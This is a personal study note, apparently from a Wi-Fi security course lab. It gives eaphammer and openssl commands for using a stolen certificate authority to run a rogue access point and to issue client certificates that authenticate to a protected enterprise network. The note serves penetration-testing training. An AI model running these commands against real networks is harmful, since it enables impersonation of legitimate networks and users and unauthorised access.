# Attacks with Stolen CAs
If you have access to a legit CA, there are some attacks you can do. You can create an AP that uses the certificate, allowing clients to connect to you without suspicion. You can also generate client certificates which allows you to connect to protected networks as a legitimate user.
## Creating an AP w/ Stolen CA
The following commands will import the stolen certificates into `eaphammer` and then create a Rogue AP with them.
```bash
cd /root/tools/eaphammer
python3 ./eaphammer --cert-wizard import --server-cert /path/to/server.crt --ca-cert /path/to/ca.crt --private-key /path/to/server.key --private-key-passwd whatever
```
## Generating a Client Cert Using a Stolen CA
A key pair is generated, and a client certificate is issued using the stolen CA, allowing authentication on the target network.
```bash
#Creation Of A Client Certificate
openssl genrsa -out client.key 2048

echo '[ req ]
default_bits       = 2048
distinguished_name = req_DN
string_mask        = nombstr

[ req_DN ]
countryName                     = "1. Country Name             (2 letter code)"
countryName_default             = ES
countryName_min                 = 2
countryName_max                 = 2
stateOrProvinceName             = "2. State or Province Name   (full name)    "
stateOrProvinceName_default     = Madrid
localityName                    = "3. Locality Name            (eg, city)     "
localityName_default            = Madrid
0.organizationName              = "4. Organization Name        (eg, company)  "
0.organizationName_default      = WiFiChallenge Lab
organizationalUnitName          = "5. Organizational Unit Name (eg, section)  "
#organizationalUnitName_default  =
commonName                      = "6. Common Name              (eg, CA name)  "
commonName_max                  = 64
commonName_default              = WiFiChallenge Lab CA
emailAddress                    = "7. Email Address            (eg, name@FQDN)"
emailAddress_max                = 40
emailAddress_default            = client@WiFiChallengeLab.com' > client.conf

echo 'extensions = x509v3

[ x509v3 ]
nsCertType = client,email,objsign
keyUsage   = digitalSignature,nonRepudiation,keyEncipherment,dataEncipherment' > client.ext

openssl req -config client.conf -new -key client.key -out client.csr
openssl x509 -days 730 -extfile client.ext -CA ca.crt -CAkey ca.key -CAserial ca.serial -in client.csr -req -out client.crt
cat client.crt client.key > client.pem.crt
```


> [!Resources]
> - [Wifi Challenge Academy](https://academy.wifichallenge.com/courses/take/certified-wifichallenge-professional-cwp/texts/57442980-introduction)
> - My [own notes](https://github.com/trshpuppy/obsidian-notes) linked throughout the text.